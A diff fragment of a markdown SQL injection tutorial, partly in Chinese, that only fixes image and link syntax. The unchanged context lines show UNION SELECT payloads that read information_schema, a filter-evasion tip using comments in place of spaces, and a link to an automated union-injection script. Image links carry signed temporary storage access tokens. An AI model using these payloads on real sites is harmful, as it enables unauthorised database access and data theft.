@@ -21,7 +21,7 @@
 		> 1 UNION SELECT 1,2&Submit=Submit#
 		
 	3. Fetch data, considering the structure of a classic Mysql_DB:
-	![https://henry-wp-backup.oss-cn-shenzhen.aliyuncs.com/Wordpress/WEB_PENETRATION/SQL_STRUCTUTRE.png?Expires=1558839911&OSSAccessKeyId=TMP.AgEnMPRvFnZWH2pt2zL2a-LiQDzkLXjGUB67M9WdK00USBLurBmvAJr4sWVZADAtAhUA2TeC9aA7vq7Oczv1vzoAkWWIxn4CFFK7JRKD4Po90RmVs7St2MA4mMga&Signature=7aSOU9AyG7dglRY4aY1wpaq6mJI%3D]()
+	![sql结构](https://henry-wp-backup.oss-cn-shenzhen.aliyuncs.com/Wordpress/WEB_PENETRATION/SQL_STRUCTUTRE.png?Expires=1558839911&OSSAccessKeyId=TMP.AgEnMPRvFnZWH2pt2zL2a-LiQDzkLXjGUB67M9WdK00USBLurBmvAJr4sWVZADAtAhUA2TeC9aA7vq7Oczv1vzoAkWWIxn4CFFK7JRKD4Po90RmVs7St2MA4mMga&Signature=7aSOU9AyG7dglRY4aY1wpaq6mJI%3D)
 	Basic form of payloads should be like 
 	> ?id=1/**/union/**/SELECT/**/table_schema,table_name/**/FROM/**/information_schema.tables/**/limit/**/2,3
 	
@@ -34,10 +34,10 @@ before using, the injection param should be put at the TAIL of url, which is
 from *?id=1%20UNION%20SELECT%201,user()&Submit=Submit#*  to  *?Submit=Submit&id=1%20UNION%20SELECT%201,user()* 
 
 ```
-[https://github.com/fix-you/SQLi-sum-up/blob/master/Sqli_auto_fetch_via_union.py](点击查看py代码0.0)
+[点击查看py代码0.0](https://github.com/fix-you/SQLi-sum-up/blob/master/Sqli_auto_fetch_via_union.py)
 ```
 效果如下：
-![https://henry-wp-backup.oss-cn-shenzhen.aliyuncs.com/Wordpress/WEB_PENETRATION/sqli_fuzz/auto_fuzzing.png?Expires=1558849553&OSSAccessKeyId=TMP.AgEnMPRvFnZWH2pt2zL2a-LiQDzkLXjGUB67M9WdK00USBLurBmvAJr4sWVZADAtAhUA2TeC9aA7vq7Oczv1vzoAkWWIxn4CFFK7JRKD4Po90RmVs7St2MA4mMga&Signature=9tJs2gYLx%2BsVnV06TaSQk6bgSfI%3D]()
+![](https://henry-wp-backup.oss-cn-shenzhen.aliyuncs.com/Wordpress/WEB_PENETRATION/sqli_fuzz/auto_fuzzing.png?Expires=1558849553&OSSAccessKeyId=TMP.AgEnMPRvFnZWH2pt2zL2a-LiQDzkLXjGUB67M9WdK00USBLurBmvAJr4sWVZADAtAhUA2TeC9aA7vq7Oczv1vzoAkWWIxn4CFFK7JRKD4Po90RmVs7St2MA4mMga&Signature=9tJs2gYLx%2BsVnV06TaSQk6bgSfI%3D)
 
 
 - 编程心得
